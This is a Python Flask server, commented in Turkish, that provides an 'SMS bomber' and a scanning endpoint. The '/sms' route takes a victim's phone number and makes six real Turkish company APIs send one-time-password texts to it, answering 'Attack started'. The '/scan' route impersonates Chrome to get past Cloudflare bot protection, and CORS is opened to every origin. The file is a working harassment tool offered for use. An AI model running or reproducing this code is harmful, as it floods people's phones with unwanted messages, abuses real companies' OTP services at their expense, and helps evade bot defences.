from flask import Flask, request, jsonify
from flask_cors import CORS
from curl_cffi import requests as cffi_requests
import requests
import threading

app = Flask(__name__)
# Tüm güvenlik kısıtlamalarını kaldır (Frontend rahatça erişsin)
CORS(app, resources={r"/*": {"origins": "*"}})

# --- 1. ADMIN SCAN FONKSİYONU ---
@app.route('/scan', methods=['GET'])
def scan():
    target_url = request.args.get('url')
    if not target_url: return jsonify({'status': 0}), 400

    try:
        # Gerçek Chrome 120 taklidi yaparak Cloudflare'i geçer
        response = cffi_requests.get(
            target_url,
            impersonate="chrome120",
            timeout=8,
            allow_redirects=True
        )
        return jsonify({'status': response.status_code, 'url': response.url})
    except Exception as e:
        return jsonify({'status': 0, 'error': str(e)})

# --- 2. SMS BOMBER FONKSİYONU ---
def send_sms_async(phone):
    """SMS API'lerini arka planda tetikler"""
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    json_data = {"phone": phone, "countryCode": "90"}
    
    # API LİSTESİ (Python Tarafında Çalışır)
    apis = [
        # Kahve Dünyası
        lambda: requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", json={"phoneNumber": phone, "countryCode": "90"}, headers=headers),
        # Bim
        lambda: requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": phone}, headers=headers),
        # İsteGelsin
        lambda: requests.post("https://prod-api.istegelsin.com/auth/v1/users/send-otp", json={"phone": "90"+phone}, headers=headers),
        # English Home
        lambda: requests.post("https://www.englishhome.com/api/member/sendOtp", json={"Phone": phone, "XID": ""}, headers={"Origin": "https://www.englishhome.com"}),
        # Porty
        lambda: requests.post("https://panel.porty.tech/api.php", json={"job": "start_login", "phone": phone}, headers=headers),
        # Pidem
        lambda: requests.post("https://restashop.azurewebsites.net/graphql/", json={"query": "mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }", "variables": {"phone": phone}}, headers={"Origin": "https://pidem.azurewebsites.net"})
    ]

    for api in apis:
        try:
            api()
        except:
            pass

@app.route('/sms', methods=['POST'])
def sms_handler():
    data = request.json
    target = data.get('target')
    
    if not target: return jsonify({'error': 'Numara yok'}), 400

    # Arka planda işlemi başlat (Sunucuyu kilitlemesin)
    threading.Thread(target=send_sms_async, args=(target,)).start()

    return jsonify({'status': 'success', 'message': 'Saldırı Başlatıldı'})

@app.route('/')
def home():
    return "SERVER ONLINE", 200

if __name__ == '__main__':
    # Render'da port genelde 10000 veya environment variable'dır
    app.run(host='0.0.0.0', port=10000)
